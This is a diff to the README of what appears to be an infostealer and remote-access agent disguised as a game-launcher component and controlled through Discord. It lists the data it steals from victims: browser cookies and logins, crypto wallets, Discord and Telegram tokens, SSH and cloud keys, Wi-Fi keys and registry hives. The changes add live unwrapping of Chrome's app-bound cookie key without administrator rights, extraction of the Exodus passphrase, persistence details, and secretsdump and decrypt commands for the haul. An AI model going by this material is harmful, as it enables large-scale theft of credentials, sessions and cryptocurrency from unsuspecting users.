@@ -43,13 +43,15 @@ Local state in `state.json`: version, channel, webhook, last ID and last heartbe
 
 ## Stealer
 
-The harvest ZIP includes launcher accounts, the Discord token validated against `/users/@me` (or, when the stored token is encrypted, the raw LevelDB files under `discord/raw/`), Exodus, Electrum, Ledger Live, MetaMask and Phantom wallets in Chrome, Edge and Brave (each browser under its own label), `Local State`, `Cookies`, `Login_Data`, `Login_Data_For_Account`, `Web_Data`, `History` plus their `-wal` companions, the DPAPI `Protect/` folder, `options.txt`, `servers.dat` and a `mods/` listing. Cookies and `Login Data` are uploaded raw. `keys.txt` carries the unwrapped AES key; when PowerShell fails it falls back to the DPAPI-wrapped `dpapi_key=` value. The ZIP is cut at 12 MB and skips files over 2 MB.
+The harvest ZIP includes launcher accounts, autologon/`Unattend.xml` administrator hints, the Discord token validated against `/users/@me` (or, when the stored token is encrypted, the raw LevelDB files under `discord/raw/`), Exodus, Electrum, Ledger Live, MetaMask and Phantom wallets in Chrome, Edge and Brave (each browser under its own label), `Local State`, `Cookies`, `Login_Data`, `Login_Data_For_Account`, `Web_Data`, `History` plus their `-wal` companions, the DPAPI `Protect/` folder, `options.txt`, `servers.dat` and a `mods/` listing. Cookies and `Login Data` are uploaded raw. `keys.txt` carries the unwrapped AES key; when PowerShell fails it falls back to the DPAPI-wrapped `dpapi_key=` value. The ZIP is cut at 12 MB and skips files over 2 MB.
 
-On Windows, for each detected browser it adds `keys.txt` with the AES key unwrapped through DPAPI from the user's own session (`v10=`) and the `app_bound=` blob if present. It is best-effort: if PowerShell is restricted, `error=` is left and `Local State` + `dpapi/` still work. It includes user, SID, profile and profile names with cookies or credentials.
+On Windows, for each detected browser it adds `keys.txt` with the user-scoped AES key (`v10=`) and, when present, the app-bound key unwrapped live through both DPAPI layers (`v20=`). Any local user may unwrap the machine layer, so v20 needs neither an administrator nor `SECURITY.hiv`. It is best-effort: if PowerShell is restricted, `error=` is left, `app_bound=` keeps the wrapped blob and `Local State` + `dpapi/` still work offline. It includes user, SID, profile and profile names with cookies or credentials.
 
 ## First run
 
-On Windows the first start needs no input. About 45-75 s in, the agent runs a background bootstrap that uploads, as separate files, system recon, `cmdkey`/RDP/FTP credentials, Wi-Fi profiles with the key, Discord, Telegram, Steam and Firefox sessions, Exodus/Electrum/Ledger, the MetaMask and Phantom extension stores, `.ssh`/cloud CLI material, a screenshot, and then the SYSTEM hives after a single UAC consent (`Start-Process -Verb RunAs` → SYSTEM task → `reg save` → packed, task removed).
+On Windows the first start needs no input. About 45-75 s in, the agent runs a background bootstrap that uploads, as separate files, system recon, `cmdkey`/RDP/FTP credentials, Wi-Fi profiles with the key, Discord, Telegram, Steam and Firefox sessions, Exodus/Electrum/Ledger, the MetaMask and Phantom extension stores, `.ssh`/cloud CLI material, a screenshot, and then optionally the SYSTEM hives after a single UAC consent (`Start-Process -Verb RunAs` → SYSTEM task → `reg save` → packed, task removed).
+
+The hives are only needed for offline `secretsdump` and older harvests: 0.2.6 already unwraps the app-bound key and the Exodus machine passphrase in the user session. A victim who does not know the administrator password can decline the prompt without losing v20 cookies.
 
 Every step has a marker and its own upload, so a crash or a declined UAC retries only the unfinished part; the hives give up after three attempts. The same run enables `persist` and auto-update; `persist off` and `update auto off` still stick afterwards.
 
@@ -65,7 +67,7 @@ Every step has a marker and its own upload, so a crash or a declined UAC retries
 ./decrypt.py harvest-0000.zip -p 'Password1' --system-masterkey <hex>
 ```
 
-v20 (app-bound) cookies need the DPAPI_SYSTEM machinekey on top, which is an LSA secret: `secretsdump.py -system SYSTEM.hiv -security SECURITY.hiv LOCAL` prints it as `dpapi_machinekey`, and `--machinekey` derives the `S-1-5-18` masterkeys from the copied folder (`--system-protect`, default `dpapi/Protect/S-1-5-18`). Without it they are reported as locked. Chrome's blob format differs between Windows builds (ANSI + alg-id strings versus UTF-16 CNG), both are parsed. `cryptography` is required, `plyvel` only for Phantom and `zstandard` only for some Exodus payloads; missing optional pieces are reported, never fatal.
+A 0.2.6 harvest carries `v20=` and `wallets/exodus-passphrase.txt` already unwrapped, so v20 cookies and the Exodus system passphrase open without administrator material. Older harvests need the DPAPI_SYSTEM machinekey on top, which is an LSA secret: `secretsdump.py -system SYSTEM.hiv -security SECURITY.hiv LOCAL` prints it as `dpapi_machinekey`, and `--machinekey` derives the `S-1-5-18` masterkeys from the copied folder (`--system-protect`, default `dpapi/Protect/S-1-5-18`). Without either, they are reported as locked. Chrome's blob format differs between Windows builds (ANSI + alg-id strings versus UTF-16 CNG), both are parsed. `cryptography` is required, `plyvel` only for Phantom and `zstandard` only for some Exodus payloads; missing optional pieces are reported, never fatal.
 
 
 ## Persistence
@@ -198,6 +200,6 @@ For manual tests of commands sent through a webhook, start the agent with `-Dspc
 - `screenshot` requires a graphical session; headless environments return an error.
 - If the gateway is down, the REST fallback adds latency (2 s active, 30 s idle).
 - The bot token and IDs are compiled in at build time; changing them requires rebuilding the agent.
-- Cookies and `Login Data` are uploaded encrypted. `keys.txt` opens `v10`; Chrome 127+ `v20` (App-Bound) cookies are not decrypted with DPAPI alone.
+- Cookies and `Login Data` are uploaded encrypted. `keys.txt` opens `v10` and carries the live-unwrapped `v20` key; if PowerShell is blocked, the wrapped `app_bound=` blob needs the machinekey offline.
 - On Linux the launcher uses `setsid nohup`; if the environment lacks them, the process may die with the game.
 - Windows persistence depends on `wscript.exe`: if Windows Script Host is disabled, the entry does not start. Copying `javaw.exe` alone is not a fallback because it needs the full runtime.
